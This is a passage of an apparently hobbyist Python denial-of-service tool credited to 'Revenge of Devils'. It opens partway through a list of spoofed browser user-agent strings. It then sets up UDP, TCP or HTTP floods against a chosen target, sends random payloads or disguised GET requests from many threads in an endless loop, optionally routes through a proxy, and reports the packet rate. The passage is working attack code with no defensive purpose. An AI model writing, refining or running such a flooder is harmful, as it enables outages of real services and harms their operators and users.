    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 OPR/80.0.4170.72",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0 Parrot/4.11",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0 Parrot/4.10",
    "Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0 Parrot/4.9",
    "Mozilla/5.0 (X11; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0 Parrot/4.8",
    "Mozilla/5.0 (X11; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0 Parrot/4.7",
    "Mozilla/5.0 (X11; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0 Parrot/4.6",
    "Mozilla/5.0 (X11; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0 Parrot/4.5",
    "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0 Parrot/4.4",
    "Mozilla/5.0 (X11; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0 Parrot/4.3",
    "Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0 Parrot/4.2",
    "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE5-00/042.007; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 NokiaBrowser/7.3.0.33 Mobile Safari/525.0.13"
]


if attack_type == "UDP":
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(10240)
elif attack_type == "TCP":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, port))
    data = random._urandom(1024)
elif attack_type == "HTTP":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, 80))
    headers = {
        "Host": target,
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive"
    }
    headers_str = ''.join([f"{header}: {value}\r\n" for header, value in headers.items()])
    request_str = f"GET / HTTP/1.1\r\n{headers_str}\r\n".encode()
    sock.sendall(request_str)


def send_packets():
    global packet_count
    while True:
        try:
            if use_proxy:
                sock.sendto(data, (proxy_ip, proxy_port))
            else:
                if attack_type == "TCP":
                    sock.send(data)
                else:
                    sock.sendto(data, (target, port))
        except:
            pass
        packet_count += 1

packet_count = 0
start_time = time.perf_counter()
start_time_ms = int(time.time() * 1000)
for i in range(threads):
    t = threading.Thread(target=send_packets)
    t.daemon = True
    t.start()

# print initial operation status
elapsed_time = 0
packet_rate = 0
print(YELLOW + f"Operation-Status\n")

# update operation status every second until stopped
try:
    while True:
        time.sleep(1)
        elapsed_time = time.perf_counter() - start_time
        packet_rate = packet_count / elapsed_time
        print(YELLOW + f"[{time.strftime('%H:%M:%S')}] Sent {packet_count} packets at {packet_rate:.2f} packets/sec" + RESET, end="\r")
except KeyboardInterrupt:
    pass

elapsed_time = time.perf_counter() - start_time
packet_rate = packet_count / elapsed_time
print(RED + f"\n_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_" + YELLOW + f"\nOperation-Result\n[{time.strftime('%H:%M:%S')}] Sent {packet_count} packets at {packet_rate:.2f} packets/sec" + RED +"\n_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_" + GREEN +"\nCopyright (c) [2023] [Revenge of Devils/Devils]. All rights reserved. Reproduction is strictly prohibited." + RESET)

logging.info(f'Target: {target}, Attack Type: {attack_type}, Port: {port}, Threads: {threads}, Use Proxy: {use_proxy}, Proxy IP: {proxy_ip}, Proxy Port: {proxy_port}, Packets Sent: {packet_count}') 

